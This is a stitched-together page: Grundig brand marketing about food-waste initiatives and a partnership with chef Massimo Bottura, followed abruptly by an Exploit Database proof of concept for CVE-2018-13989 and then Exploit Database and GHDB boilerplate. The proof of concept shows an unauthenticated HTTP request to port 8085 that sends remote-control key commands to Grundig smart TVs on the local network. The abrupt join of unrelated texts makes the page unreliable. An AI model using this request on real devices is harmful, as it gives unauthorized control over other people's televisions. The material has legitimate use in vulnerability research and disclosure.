Grundig is not only a supplier of home electronics. We are much more. We are the brand for people who know what really matters in life.

That goes not only for the appliances we manufacture but also the quality of life they provide. It all began 70 years ago, with our first breakthrough – the

         Heinzelmann radio. We knew we were onto something when we saw how this Grundig radio improved people’s quality of life.

               Ever since then, we have never stopped working to understand you better and take the hard work out of your daily routine.

We are Grundig.

We’ve been gathering people together since our very beginning.

First, it was around the radio, then around the television.

And from there, to every corner of the home.

We’re not just thinking about how to make better devices.

We’re thinking about how to become better human beings.

Our purpose is to inspire people to take a small step towards a better future, with thoughtful and eco-friendly designs that put people first and respect our planet at the same time.

Aesthetically harmonious, obsessed about quality, and ever more sustainable.

Wasting food is wasting life

At Grundig, we feel that it’s our responsibility to lead the fight against food waste. To remind the world not to take food for granted, but to treat it with care. Respecting food is the only way we can ensure a better future. And as a brand that believes in a better future, every day we’re working toward developing new technologies that fight food waste. That’s our mission.

By adopting Respect Food initiative with a strong eco conscience, we champion the cause of reducing food waste. Our **«Respect Food»** initiative aims to inspire everyone to fight with us, by showing people how to tackle waste in kitchens with innovative products and partnerships. That‘s how we manage to save more than 50 tonnes of food being wasted till today.

Let’s **#RespectFood** together.

 Massimo Bottura and Grundig:

                                                                                                    A partnership brings out the best

![Image Container]()

![Image Container]()

The only way to push quality forward is by joining brilliance.

Based on our shared values for quality, aesthetics and ethics we’re collaborating with the world-renowned chef, one of the most influential people by Time magazine; Massimo Bottura.

«Little things we do in our home have great impact outside», that’s our common belief with Massimo Bottura. Thanks to his influential power, our aim is to inspire people at home to pursue a better future.

Homes. Massimo. Grundig. Our planet. Everything connected as one.

That‘s how we imagine Grundig coming together as an honest, relevant and unique home brand. We‘re in the right place, at the right time, with the right partner.

# Version: Before > Smart Inter@ctive 3.0
# Tested on: Kali Linux
# CVE : CVE-2018-13989

# I'm trying my TV.I saw a Grundig remote control application on
# Google Play. Computer I downloaded and decompiled APK.
# And I began to examine individual classes. I noticed in a class
# that a request was sent during operations on the command line.
# I downloaded the phone packet viewer and opened the control application and
# made some operations. And I saw that there was such a request;

# PoC

request ->
GET /sendrcpackage?keyid=-2544&keysymbol=-4081 HTTP/1.1
Host: 192.168.1.106:8085
Connection : Keep-Alive
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

response ->
HTTP/1.1 200 OK
Content-Type : text/plain

# Set rc key is handled for key id : -2544 key symbol : -4081
# The only requirement for the connection between the TV and the application
# was to have the same IP address. After I made the IP address on the TV
# and the phone and the IP address on the computer the same:
# I accessed the interface from the 8085 port. Now I could do anything from the computer :)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
